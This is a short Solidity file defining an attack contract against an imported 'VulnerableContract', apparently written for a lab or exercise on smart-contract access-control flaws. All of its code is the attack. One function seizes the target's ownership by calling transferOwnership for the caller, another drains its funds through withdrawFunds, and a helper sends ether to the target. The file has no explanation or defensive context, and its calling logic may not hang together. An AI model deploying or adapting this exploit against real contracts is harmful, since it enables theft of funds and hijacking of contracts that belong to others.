// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    // Exploit function to take ownership
    function exploitOwnership() public {
        vulnerableContract.transferOwnership(msg.sender);
    }

    // Function to drain funds
    function drainFunds(uint256 amount) public {
        vulnerableContract.withdrawFunds(amount);
    }

    // Function to add funds to the vulnerable contract
    function addFunds() public payable {
        vulnerableContract.addFunds{value: msg.value}();
    }
}
